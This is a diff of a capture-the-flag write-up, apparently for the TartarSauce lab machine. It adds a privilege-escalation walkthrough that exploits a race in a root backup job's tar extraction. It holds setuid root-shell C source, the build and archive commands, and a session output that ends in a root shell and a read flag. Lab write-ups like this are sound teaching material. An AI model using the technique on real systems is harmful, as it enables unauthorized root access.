@@ -1597,7 +1597,7 @@ ExecStart=/usr/sbin/backuperer
 
 ```
 
-Now we know how the backuperer program is being run. Let's run the binary to see what it does:
+Now we know that the backuperer program is being run every 5 minutes. Let's run the binary to see what it does:
 
 ```
 onuma@TartarSauce:/$ ls -la /usr/sbin/backuperer 
@@ -1689,26 +1689,130 @@ How does this work:
 * backuperer being run as root every 5 minutes
 * creates a test file /var/backups/onuma\_backup\_test.txt
 * cleanup from previous backup - remove /var/tmp/.\* and /var/tmp/check
-* creates a temp backup of website and saves in /var/tmp, command run as user onuma
+* creates a backup archive of webroot (/var/www/html) and saves in /var/tmp, command run as user onuma
   * sudo -u onuma /bin/tar -zcvf /var/tmp/.random\_chars /var/www/html
-* wait 30 seconds
+* waits 30 seconds for backup to complete
 * create /var/tmp/check directory
 * run tar as root to extract the archive created by onuma to the check directory: /bin/tar -zxvf /var/tmp/.random\_chars -C /var/tmp/check - creates /var/tmp/check/var/www/html ...
 * do a compare between the webroot and the extracted backup of the webroot
 * then either report errors (differences) and exits (leaving the extracted files until the next job run) OR
 * move the /var/tmp/.random\_chars archive file to /var/backups/onuma-www-dev.bak
 
-There is a 5 minutes gap between the backups. When the backup is run, it waits 30 sec before doing the check. If we add a SUID file to the webroot, create an archive of the webroot, and replace the one created by the backup job within the 30 second window, the archive will be extracted as root into the check directory, the diff will run and fail because we added a file, and the check directory will remain until the next backup job is run in about 4 minutes or so.
-
-Add new file, suid binary.
-
-10:45; 10:50
-
-
+This is going to be a bit tricky to exploit, and so we'll need to come up with a plan.
 
 ## Privilege Escalation
 
-​ ​ ​ ​ ​ ​
+In order to escalate privileges, we need to create a tar archive file which contains the /var/www/html directory structure with a SUID binary owned by root. Once we have the tar file, we need to transfer it to the target system, and wait for the backuperer script to create the temp archive with the random name. Then we need to overwrite that file with our archive within 30 seconds while the script sleeps. The script will then extract our archive, run the integrity check, which will fail, and then exit without deleting the extracted items. We can then navigate into the extracted directory containing our SUID binary and run it to get a root shell.
+
+Steps to get root as follows:
+
+1\. On attacker machine, create simple setuid c file and compile as 32bit binary
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(void)
+{
+    setuid(0); 
+    setgid(0); 
+    system("/bin/sh");
+}
+```
+
+```
+└─$ sudo gcc -m32 setuid_sh2.c -o priv
+
+```
+
+2\. Create directory: /tartarsauce/var/www/html as root
+
+```
+└─$ sudo mkdir -p tartarsauce/var/www/html
+
+└─$ cd tartarsauce
+```
+
+3\. Copy setuid into directory, and sudo chmod ug+s setuid --must setuid as root and root must own file
+
+```
+└─$ sudo cp priv var/www/html
+
+└─$ sudo chmod ug+s var/www/html/priv
+
+└─$ ls -la var/www/html              
+total 24
+drwxr-xr-x 2 root root  4096 Nov  8 06:53 .
+drwxr-xr-x 3 root root  4096 Nov  8 06:52 ..
+-rwsr-sr-x 1 root root 15192 Nov  8 06:53 priv
+
+```
+
+4\. Tar the var/ directory
+
+```
+└─$ sudo tar -zcvf privesc.tar.gz var 
+var/
+var/www/
+var/www/html/
+var/www/html/priv
+
+```
+
+5\. Transfer tar file to /var/tmp on target
+
+6\. Wait until backup job runs -- "date;ls -a" OR if you have a fully interactive shell "watch -n 1 systemctl list-timers"
+
+7\. Overwrite the /var/tmp/.randowm\_chars backup file with the one we created (must be done within 30 seconds from when the tar is created by the backup script; need to watch or refresh)
+
+```
+onuma@TartarSauce:/var/tmp$ cp privesc.tar.gz .b7e420b962837ff99dd17d1278d5091cdaf7fc93
+< cp privesc.tar.gz .b7e420b962837ff99dd17d1278d5091cdaf7fc93                
+onuma@TartarSauce:/var/tmp$ ls -la
+ls -la
+total 48
+drwxrwxrwt 10 root  root  4096 Nov  8 07:06 .
+drwxr-xr-x 14 root  root  4096 Feb  9  2018 ..
+-rw-r--r--  1 onuma onuma 2675 Nov  8 07:06 .b7e420b962837ff99dd17d1278d5091cdaf7fc93
+-rw-r--r--  1 onuma onuma 2675 Nov  8 06:54 privesc.tar.gz
+
+```
+
+8\. The script then extracts the archive. Navigate to /var/tmp/check/var/www/html
+
+```
+onuma@TartarSauce:/var/tmp$ cd check/var/www/html
+cd check/var/www/html
+onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -la
+ls -la
+total 24
+drwxr-xr-x 2 root root  4096 Nov  8 06:53 .
+drwxr-xr-x 3 root root  4096 Nov  8 06:52 ..
+-rwsr-sr-x 1 root root 15192 Nov  8 06:53 priv
+onuma@TartarSauce:/var/tmp/check/var/www/html$
+
+```
+
+9\. Run the setuid binary to get root shell
+
+```
+onuma@TartarSauce:/var/tmp/check/var/www/html$ ./priv
+./priv
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(onuma)
+# cd /root 
+cd /root
+# ls
+ls
+root.txt  sys.sql  wp.sql
+# cat root.txt 
+cat root.txt
+e79abdab8b8a4b64f8579a10b2cd09f9
+#
+```
 
 ## Resources
 
